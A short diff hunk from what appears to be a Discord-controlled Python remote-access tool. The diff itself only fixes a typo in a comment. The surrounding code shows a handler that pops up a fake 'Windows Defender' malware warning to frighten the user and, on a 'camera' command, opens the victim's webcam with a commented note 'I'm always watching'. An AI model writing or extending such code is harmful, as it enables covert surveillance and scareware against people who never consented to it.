@@ -192,7 +192,7 @@ async def on_message(ctx):
             Mbox('Windows Defender', 'Your system has been detected containing malware. Action must be taken immediately.', 1)
 
         if "camera" in ctx.content:
-            #cv2.namedWindow("I am alwayse watching(press esc to close)")
+            #cv2.namedWindow("I'm always watching(press esc to close)")
             vc = cv2.VideoCapture(0)
 
             if vc.isOpened(): # try to get the first frame
